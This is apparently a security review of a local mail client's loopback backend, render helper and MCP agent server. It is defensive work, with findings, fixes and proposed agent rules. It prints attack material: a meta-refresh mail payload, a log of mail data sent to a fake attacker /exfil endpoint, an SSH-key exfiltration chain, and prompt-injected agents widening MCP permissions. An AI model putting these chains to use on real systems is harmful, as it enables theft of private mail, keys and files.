## 1. Executive summary

**Overall posture.** The pieces that were designed as security boundaries are mostly well built: the MCP server
(token, Host/Origin checks, default-deny policy, untrusted-content wrapping), Google OAuth (PKCE S256, random state,
random loopback port), token storage (Secret Service only, in-memory fallback, single-flight refresh), SQL (every
value bound, FTS terms quoted), outgoing MIME headers, attachment save names, and the at-most-once outbox. The
problem is where the boundary sits: **the UI backend on `127.0.0.1:27182` has no authentication, no Host/Origin
check and sends `Access-Control-Allow-Origin: *` on 65 response paths.** Every local process, the WebKit render
helper, any agent with an HTTP tool, and any web page (after one Local Network Access click in Chrome 142+/Firefox)
can read all cached mail, contacts, SMS and calendar data and drive 91 write routes, including send-with-attachment
and the routes that turn on and widen the MCP agent's permissions. Most of the high findings are consequences of that
one gap, so most of them close with one change.

**Top 5 risks**
1. **SEC-008 is fixed in the tree but not in the running app** (Critical). Until `./build.sh --live` runs, an HTML
   mail with `<meta http-equiv=refresh>` from a spoofed always-HTML sender can, with no click (30 s pre-render),
   read the backend and exfiltrate mail, turn MCP on, and remove accounts. Fixed in `2e927f1` (OL-055), retested in
   the sandbox.
2. **SEC-001 Unauthenticated UI backend** (High, Confirmed). Root cause of SEC-002/003/005/009 and of SEC-008's impact.
3. **SEC-002 Any readable file can be attached and sent** (High, Confirmed up to send). `/compose/send` and
   `/drafts/save` take `attachments[].path` from the request and copy any file the user can read.
4. **SEC-003 MCP permissions can be widened through 27182** (High, Confirmed). Seven cross-origin POSTs move MCP from
   "locked" to listening with calendar write tools enabled, bypassing the MCP server's own guards.
5. **SEC-012 "Remove account" leaves 18 tables of that account's data** (Medium, Confirmed by failing test), which
   contradicts `docs/privacy-policy.md:75-79`.

**Single best next action.** Deploy OL-055 (`./build.sh --live`, needs your approval), then land roadmap Phase R1
steps 1–4: one QML backend client, a real request parser with timeouts, an Origin/Host guard without `ACAO *`, and a
per-launch session token with fail-closed bind. That closes SEC-001, SEC-003, SEC-004, SEC-005, SEC-015 and removes
the remaining SEC-009 path, in about four small commits.

## 2. Threat model

**Assets.** OAuth refresh/access tokens (Secret Service); cached mail bodies, attachments, contacts, calendar, SMS
(`~/.config/omalook/messages.db`, 286 MB here; `~/.cache/omalook/`); the ability to send mail, SMS and invitations as
the user; MCP token and policy; local files readable by the user (exfiltration target via SEC-002).

**Actors.**
- A1 Mail/invite/SMS sender (remote, unauthenticated, controls HTML, headers, filenames, ICS fields).
- A2 Web page in the user's browser (needs one LNA "Allow" in current Chrome/Firefox; Vivaldi assumed same).
- A3 Other local process, same uid (out of scope for confidentiality: it can read the keyring and DB anyway, but it
  should not be able to freeze or squat the backend without effort) or another uid (in scope).
- A4 A prompt-injected AI agent: over MCP (designed for), or with any HTTP/browser tool (bypasses MCP entirely by
  calling 27182).
- A5 Malicious or broken provider response (Graph/Google), and a network attacker (TLS client only).

**Trust boundaries** (★ = where the boundary should be and is weak today)

### 3.2 Sections

#### SEC-008 — Render helper navigation → script → backend (Critical, Confirmed, S) — FIXED in `2e927f1`
- **Location.** `tools/render/omalook-render.c` before `2e927f1`: `on_policy` (102-113) let navigation type
  `OTHER` through (meta refresh is `OTHER`); CSP was a `<meta>` prepended to the mail (141), covering the first
  document only; `webkit_settings_set_enable_javascript(st, TRUE)` (152).
- **Evidence.** Sandbox (bwrap `--unshare-net`, fake attacker server, real backend on an alternate port):
  `8099 GET /evilpage` → `27182 GET /messages/body?id=1 Origin=http://127.0.0.1:8099` → `8099 GET /exfil?d={"secret":"MAIL-BODY-CANARY"}`,
  with images on and off. End to end: a body `<p>Your invoice</p><meta http-equiv=refresh content="0;url=…">` flipped
  `/settings/mcp` `enabled` false→true and sent the settings JSON out (`p2-render/req.log`, `e2e.sh`).
- **Reach.** View as HTML; always-HTML senders; global HTML mode; and **zero-click** daemon pre-render
  (`main.rs:265-276` → `render_cache.rs:181-210`, every 30 s, up to 3 recent messages from always-HTML senders).
- **Fix applied.** Only `about:blank` may load; `enable-javascript-markup` off; WebKit content blocker for
  loopback/private/IPv6-literal/ws always, all remote without `--images`; fail closed. Retest
  `p2-render/fixed-run.txt`: 20 cases × 2 modes, 0 requests and 0 file access for attack cases; normal mail renders
  with link boxes. Residual: a DNS name resolving to 127.0.0.1 is still fetched with `--images` (SEC-009) — closed
  by the SEC-001 token.
- **Verify on deploy.** After `./build.sh --live`, `cmp bin/omalook-render /opt/omalook/bin/omalook-render`, rerun
  `p2-render/e2e.sh` against the scratch backend.

#### SEC-001 — Unauthenticated UI backend (High, Confirmed, M)
- **Location.** `src/main.rs:2875` bind; `2892-2897` sequential accept, 1 KiB first read; router `2900-4177`; 65
  `Access-Control-Allow-Origin: *` sites. 150 routes, 91 mutate state.
- **Evidence (sandbox probes `sandbox/out-run.txt`).** `GET /accounts` with `Origin: https://evil.example` → 200 +
  `ACAO *`. `Host: attacker.example` → 200 (DNS-rebinding shape). `/fs/list?path=/etc&hidden=true` → listing. `POST
  /accounts/remove` reached removal (stopped only by the sandbox's missing keyring). POST bodies sent as
  `Content-Type: text/plain` (CORS simple request, no preflight) are parsed.
- **Impact.** Read all cached mail/contacts/SMS/calendar; send mail and SMS; change rules, signatures, lists;
  enable MCP; remove accounts. Vectors without any prompt: other local users, flatpak apps sharing host network,
  agents with HTTP tools, the WebKit helper (pre-fix).
- **Fix.** Roadmap R1 steps 1–4 (Option A, §4.2): single QML client → parser + timeouts → guard (reject any `Origin`,
  require `Host: 127.0.0.1:<port>`, drop `ACAO *`) → per-launch 256-bit token in `$XDG_RUNTIME_DIR/omalook/ui.token`
  (dir 0700, file 0600, tmp+rename; reuse `mcp/token.rs`) passed to the UI by env, constant-time compare.
  ```rust
  // http/guard.rs
  pub fn check(req: &Request, cfg: &Guard) -> Result<(), Status> {
      if req.header("origin").is_some() { return Err(Status::Forbidden); }
      if req.header("host") != Some(cfg.host.as_str()) { return Err(Status::Forbidden); }
      let tok = req.header("authorization").and_then(|v| v.strip_prefix("Bearer "));
      if !tok.map_or(false, |t| crate::mcp::token::ct_eq(t, &cfg.token)) { return Err(Status::Unauthorized); }
      Ok(())
  }
  ```
- **Verify.** Route tests: no token → 401; any `Origin` → 403; wrong `Host` → 403; good request → 200. Rerun
  `sandbox/probes.sh` — every probe must fail. Hypothesis to settle first: Qt's QML `XMLHttpRequest` sends no
  `Origin` header (check with a scratch UI against a logging backend before enabling the Origin rule).

#### SEC-002 — Local file exfiltration through compose/drafts (High, Confirmed up to send, S)
- **Location.** `main.rs:1322-1394` (`compose_send_response`) takes `attachments[].path`;
  `attach_spool.rs:86-132` `snapshot` → `copy_one` (53-81) copies any regular readable file.
- **Evidence.** Cross-origin `text/plain` POST with `attachments=[<private file>]` validated up to "that account is
  not signed in"; `POST /drafts/save` with the same body returned `ok:true` and spooled the file into
  `~/.cache/omalook/drafts/<id>/…` (drafts sync to the provider). Actual send not executed (no live provider).
- **Exploit.** `GET /accounts` (readable cross-origin) → one `POST /compose/send` to an attacker address with
  `~/.ssh/id_ed25519` attached, sent from the user's own account after the undo delay.
- **Same class (Low alone).** Contact photo set reads any path, JPEG magic only (`main.rs:1548-1568`); contact import
  reads any `.vcf/.csv` ≤ 20 MB (`main.rs:1603-1613`).
- **Fix.** Short term: the UI pick/paste/drop routes register a path in a per-session allow-list and return a handle;
  compose/drafts accept only handles (or paths in the allow-list, or under the spool). Long term: `FileHandle`
  registry in `app/` (roadmap R3).
- **Verify.** Test: a request naming an unregistered path → 400; a picked path → spooled. Rerun probe Q1/Q2.

#### SEC-003 — MCP policy writable from 27182 (High by chaining, Confirmed, S)
- **Location.** `src/mcp/admin.rs:24-95` serves `/settings/mcp/*` on 27182, query-string only (works as a no-cors
  POST). `policy.rs:176` active = enabled && run_in_background; `POST /settings/background?enabled=true` (`main.rs:3985`).
- **Evidence.** From the locked defaults, 7 cross-origin POSTs → MCP listening on 27183, mail+calendar=write,
  contacts+sms=read, `calendar_create_event=allow`; `tools/list` then shows 19 tools including 3 calendar writes.
  `token/regenerate` rotates the token cross-origin; `copy?what=token` put it on the clipboard.
- **Impact.** The MCP default-deny design is only as strong as 27182. Once widened, a mail-borne prompt injection
  can create invitations to arbitrary addresses (an outbound text channel).
- **Fix.** SEC-001 token on every `/settings/mcp/*` route; any change that widens agent power requires a
  confirmation shown in the UI (not just an authenticated request); no state change from query strings; move these
  routes to `POST` with a JSON body.
- **Verify.** Rerun probe Q3: all 7 POSTs refused; a widening from the UI shows the confirm.

#### SEC-004 — Single idle connection freezes the backend (Medium, Confirmed, S)
- **Location.** `main.rs:2894-2895` first `read` with no timeout on the only accept thread; `read_post_body` 5 s.
- **Evidence.** Probe P8: one idle TCP connection → every other request (including `/sync/serial`) times out until it
  closes. Q6: a lying `Content-Length` stalls all routes ~4.3 s per request. MCP 27183 (thread per connection, 5 s
  timeouts) kept answering under the same test.
- **Fix.** Roadmap R1 step 2: read timeouts, full header parse, `Content-Length` body read with 1 MiB cap, bounded
  thread per connection. Also fixes the 1 KiB first-read bug in `/settings/signature`.
- **Verify.** Test with an idle socket held open: a second request answers in < 100 ms.

#### SEC-005 — Persistent tampering through settings routes (Medium, Confirmed, S via SEC-001)
- **Location.** `main.rs:3908-3920` `POST /settings/signature?account=ID`; same class: `/settings/senders/*`
  (always_html / always_images per sender → tracking pixels and SEC-008-style reach for an attacker's domain),
  `/rules/*`, `/local-rules/*`, `/lists/*` (adding an attacker address to a distribution list = silent copy).
- **Evidence.** Cross-origin POST `{"text":"hi <a href=https://evil.example>x</a>"}` saved and read back; `always_html`
  add confirmed (P5b). Functional bug: signatures > ~1 KiB fail (first-read limit).
- **Fix.** Closed by SEC-001. Add to tests: each settings write route refuses without token.

#### SEC-009 — Loopback/LAN fetches with "Load images" (Medium, Confirmed, S) — partly mitigated
- **Evidence.** With `--images`, `img-src data: https: http:` let case c12 request
  `27182 GET /accounts/remove?account=x` and `/settings/mcp` (GETs; GETs that call providers exist).
- **Status.** `2e927f1` blocks loopback/private/IPv6 literals. Residual: a DNS name pointing at 127.0.0.1 (case c19).
  Closed for 27182 by the SEC-001 token; for LAN devices, consider fetching images in Rust with a private-IP block
  after DNS resolution and inlining them as `data:` URIs.

#### SEC-010 — Remote fetch from the Qt HTML fallback via `style … url()` (Medium, Confirmed, S)
- **Location.** `qml/mail/format.js:240-242` strips `background=`, `srcset`, `poster`, remote `<img>` but keeps inline
  `style="background:url(http://…)"`. Used when the helper is missing/failed (`MessagePreview.qml:440`, `Text` at 897).
- **Evidence.** `p2-render/qtbg.qml` under `qml6` offscreen requested three URLs from the fake server.
  An attacker can force the fallback: a 60,000-px body makes the helper exit 4; after 3 failures the helper is off
  for the session (`MessagePreview.qml:268-270, 335-337`).
- **Impact.** Read beacons/IP leak despite "remote images blocked by default"; loopback/LAN GETs; re-opens the OL-004
  crash class (Qt Text resource fetch).
- **Fix.** Drop `url(` from any `style` value (or remove background/background-image/list-style-image/content
  properties); never hand Qt a remote URL in any attribute. Reset the helper failure counter per message or cap it
  per sender rather than per session.
- **Verify.** Add sanitizer cases S15/S21 to `tests/`; rerun `qtbg.sh`: zero requests.

#### SEC-012 — Remove account leaves data behind (Medium, Confirmed by failing test, S)
- **Location.** `account_ops.rs:385-391` → `db.rs:728-741` deletes `messages, folders, calendar_events, contacts,
  contact_folders, mail_delta, accounts`. 25 tables carry `account_id`.
- **Evidence.** Scratch test `src/db/review_sec012.rs` (in `p3-review-tests.patch`) seeds one row per table and calls
  `delete_account`: rows remain in 18 tables (outbox and drafts with bodies, tasks, identities, rules state, category
  state, contact/calendar outboxes, dl_sync_*). Cache dirs `drafts/ outgoing/ contact-photos/ sms-attachments/` and
  the render cache are not touched. `secure_delete=0`, no VACUUM.
- **Fix.** `ACCOUNT_TABLES` constant in the schema module + a test that walks `sqlite_master` and fails when a table
  with `account_id` is missing from it; delete all in one transaction; remove per-account cache dirs; `PRAGMA
  secure_delete=ON` for the delete or incremental VACUUM after. Use the scratch test as the regression test.
- **Live data.** 0 orphan rows today (latent).

#### SEC-015 — Port squatting (Medium on multi-user hosts, Low here; Likely, S)
- **Location.** `main.rs:2877-2888`: on bind failure, warn ("falling back to file triggers") and return; the UI is
  launched independently (`main.rs:69/88`). Same for MCP clients configured for 27183.
- **Impact.** A process (any uid) that holds 27182 first receives compose bodies, drafts, search terms and the
  future session token, and controls what the UI renders.
- **Fix.** Fail closed: exit with a clear error, UI shows "backend unavailable". The token alone does not fix this
  (the UI would send it to the squatter); Option B (Unix socket in a 0700 dir) removes it by construction.
- **Verify.** Hold 27182 with `nc -l`, start a scratch instance: it must exit non-zero and the UI must not send requests.

#### SEC-007 — Known-vulnerable dependencies (Medium as policy, Confirmed, M)
- `cargo audit` (0.23.0): 15 vulnerabilities, 10 warnings across 380 crates. reqwest 0.11 stack: h2 0.3.27, rustls
  0.21.12, rustls-webpki 0.101.7, webpki-roots 0.25.4; ureq 2.12.1 stack: rustls 0.23.45, rustls-webpki 0.103.15;
  rusqlite 0.30 → bundled libsqlite3-sys 0.27 (RUSTSEC-2026-0459). Warnings: tokio AsyncFd unsound, zbus 3.x
  unmaintained deps, yanked crates.
- **Exploitability.** Low: TLS is client-only to Google/Microsoft; no Debug logging of TLS sessions found; SQL inputs
  are bound and FTS terms quoted. The finding is about policy: no audit gate exists.
- **Fix.** Drop reqwest 0.11 (one HTTP client), update ureq/rustls, rusqlite to a version bundling the fixed SQLite,
  plan zbus 4/5, add `cargo audit` and a `deny.toml` to `scripts/verify.sh`.

#### SEC-011 — Any link scheme in the Qt fallback (Low, Confirmed, S)
- `format.js` keeps `href="file:///…"`, `data:text/html,…`, `java&#x09;script:` (corpus S06/S08/S09);
  `MessagePreview.qml:898` `onLinkActivated: Qt.openUrlExternally(link)`; also `:203`, `:756`.
- **Fix.** One QML `openExternal(url)` helper allowing `http`, `https`, `mailto` (and `tel` where intended), used by all
  12 `Qt.openUrlExternally` sites; sanitizer drops other schemes. Test in `tests/external.test.js`.

#### SEC-006 — Google sign-in abort (Low, Likely, S)
- `google_auth.rs:257-268`: any request to the loopback callback with a wrong/missing `state` → `Callback::Failed`.
  Fix: answer 404 and keep waiting until timeout. PKCE, state, bind and timeout are otherwise correct (205-231).

#### SEC-013 — Dead retention setting (Low, Confirmed, S)
- `models.rs:663/702` `cache_retention_days` (default 30) never read; `db.rs:1776` `cleanup_old_messages` has no
  caller. Either wire it (respecting purge rules) or remove the setting so the UI does not imply a limit.

#### SEC-014 — Spike refresh tokens on disk (Low–Medium, Confirmed, S)
- `~/.config/omalook/spike_token.json` (Microsoft) and `spike_google_token.json` (Google), mode 0600, written by
  `tools/spike/graph_spike.py:20` and the Google spike; values not read by the reviewer. Contradicts "tokens only in
  the keyring". Fix: delete them, revoke those grants, make spikes use a tmpfs path or the app's broker, and document
  cleanup in the spike README.

#### ARCH-C1 — Silent death of sync threads (Medium, Confirmed code, S)
- `scheduler.rs:252-272` `spawn_sync_thread`: no `catch_unwind`, `JoinHandle` dropped, `running` entry kept (UI keeps
  showing synced). Reachable example: `email_daemon.rs:801` `.unwrap()` in the rule-move check.
- **Fix.** Supervisor: run each cycle under `catch_unwind` (`AssertUnwindSafe(fut).catch_unwind()`), log, back off,
  restart; clear `running` on exit; expose "sync stopped: <reason>" to the UI. Test with a fake provider that panics.

#### ARCH-H1 — Provider calls on the accept thread (Medium, Confirmed code, M)
- Inline network work on the only accept thread: `/compose/originals` (`main.rs:3320-3321` → `925`), `/calendar/find`
  (3517), contacts (3035), drafts (3350), GET rules/local rules (3630/3670). Others spawn per request. While one waits
  on Graph/Google, all 150 routes stall. Also 54 `Database::open` calls in `main.rs`, each running schema DDL.
- **Fix.** Falls out of R1 step 2 (thread per connection) and R3 (shared runtime, open-once connections).

#### ARCH-S1 — Gmail reconcile without cap (Low–Medium, Confirmed by test, S)
- `email_daemon.rs:1001-1012` → `db.rs:1750-1772`: an `Ok([])` listing wipes the folder (scratch test: 200 → 0).
  Graph has a count check + 20 % cap (`db.rs:2008-2022`). Fix: reuse the Graph guard; test from the patch.

#### ARCH-S2 — Calendar updates without If-Match (Low–Medium, Confirmed code, S)
- Last writer wins against edits made in Outlook/Google since the last sync. Reuse the contacts pattern
  (`contacts_outbox.rs:119-122`: etag, 412 → conflict state).

#### ARCH-S3 — 401 handling and clock (Low, Confirmed code, S)
- Graph (`graph.rs:590-593`) and Google (`google_api.rs:180-215`) treat 401 as a plain error; refresh happens only by
  local expiry (`token_store.rs:289`, 60 s margin; expiry = local now + `expires_in`, `:392/:401`). A token revoked early,
  or a local clock set back after a refresh, fails every cycle for up to an hour. Clock jumping forward only causes an
  early refresh (harmless). Google retries ignore `Retry-After`. Fix: on 401, drop the cached access token once and retry.

#### ARCH-T1 — Hard-coded port in Tasks/People (Low, Confirmed code, S)
- `TasksView.qml:94/104` hard-code `http://127.0.0.1:27182` (including `POST /tasks/<id>/complete`); `PeopleView.qml:27`
  defaults to 27182 and `AppShell.qml:194` binds no `backendUrl`. A scratch UI on `OMALOOK_PORT` writes to the live
  backend from these views. `main.rs:2873-2874` comment is stale. Fixed by R1 step 1.

#### ARCH-Q1 — Routes are untestable (Low, debt, M)
- Zero `#[test]` in `main.rs`; routing order, headers and auth have no tests; provider base URLs are hard-coded
  (29 Graph literals) so HTTP-level fault injection is impossible. Fix: router module with tests (R1 step 4 starts
  it), injectable base URL per provider.

#### HARD-1..5 and INFO
- **HARD-1** `~/.config/omalook`, `~/.cache/omalook` 0755; `messages.db` (+wal/shm), `settings.toml`, `perf.log`,
  `search_history.json`, `view_state.json`, `auth_state.json` 0644. Home is 0710 here, so not reachable by other users
  today. Fix: create both dirs 0700 at startup in one place; `umask 077` for the daemon.
- **HARD-2** `perf.log` logs every request line (`/fs/list?path=…`, search terms, account ids). Log method + route
  name only.
- **HARD-3** MCP server spawns a thread per connection with no cap (`server.rs:142`). Add a cap.
- **HARD-4** Routing by `first_line.contains("GET /x")`; method-less arms at 3006/3700/3965; arm order decides
  behavior. Replaced by the typed router.
- **HARD-5** `compose.rs:797-801` writes In-Reply-To/References raw from provider data — strip CR/LF.
  `attachments.rs:105-127` keeps U+202E and other `Cf` characters (`invoice\u202Egpj.exe`) — strip them.
- **INFO, privacy policy drift.** Not listed: host `openidconnect.googleapis.com` (userinfo); scopes
  `gmail.settings.basic` (`google_auth.rs:40-41`), `MailboxSettings.ReadWrite` (`auth.rs:27`), `Mail.Send`;

- **INFO, logging.** No access/refresh token is logged (rg over all 523 log-macro lines; 116 flagged lines read). `auth.rs:246-254/558-567` print

### 4.2 Target architectures

**Option A — Hardened loopback TCP with a session token** (cost S–M, about a week of small commits)
Per-launch token in `$XDG_RUNTIME_DIR/omalook/ui.token` + env to the child UI; new `src/http/` front (parser,
limits, timeouts, typed router, guard middleware); bind failure exits. Closes SEC-001/003/004/005/015 (fail-closed
part) and the SEC-009 residual. Keeps curl debugging (`curl -H "Authorization: Bearer $(cat …)"`) and the scratch
workflow (token file per port). Residual: same-uid processes can read the token — acceptable, they can already read
the keyring and the DB.

**Option B — Unix-domain socket** (cost M–L)
`$XDG_RUNTIME_DIR/omalook/ui.sock` in a 0700 dir; unreachable from browsers, WebKit, other users and squatters by
construction; `SO_PEERCRED` for free. QML side: `Quickshell.Io.Socket` (present in 0.3.2) with framed JSON
`{id, method, path, body}` → `{id, status, body}` behind the single client, or a `QLocalSocket` type in the existing
plugin. Needs request correlation, reconnect, and an async replacement for the synchronous draft save on close
(`AppState.qml:1418-1419`). Loses curl (add `omalook-cli`). MCP's stdio shim could move to the socket and retire 27183.

**Option C — One capability/service layer** (cost L, incremental; orthogonal to A/B)
`src/app/` services per domain: typed input → validate → `authorize(caller)` → execute, with
`Caller = Ui | Mcp { policy }`. `policy.decide` moves here, so UI and agent share one choke point; HTTP routes and MCP
tools become thin adapters; file inputs become server-issued `FileHandle`s (closes the SEC-002 class). Grows behind
A's router route group by route group (strangler pattern), never as a rewrite.

**Option D — Backend in-process as a QML plugin** — rejected: background sync and MCP need a daemon anyway; a Rust
panic or blocking call would freeze the shell; brings back the cxx-qt complexity the project abandoned.

**Option E — D-Bus session service** — rejected for now: Quickshell 0.3.2 has no generic D-Bus client from QML
without C++; revisit only if desktop integration (OL-008 notifications, URL handler) needs it.

**Recommendation.** A now (it is mostly the router the code needs anyway), C as the long-term structure behind A's
router, B as an optional last step once every UI call goes through one QML client — then the transport swap is one
QML file plus the listener.

## 6. Rules for future models (proposed AGENTS.md section)

## Security rules (from docs/REVIEW-2026-11-12.md; details in the omalook-secure-by-default skill)
- Every backend route goes through the router + guard (token, no Origin, exact Host). Never add a route as a
  `first_line.contains(...)` arm, never send `Access-Control-Allow-Origin`.

- Scratch instances: OMALOOK_PORT + Backend.qml only; never hard-code 27182.
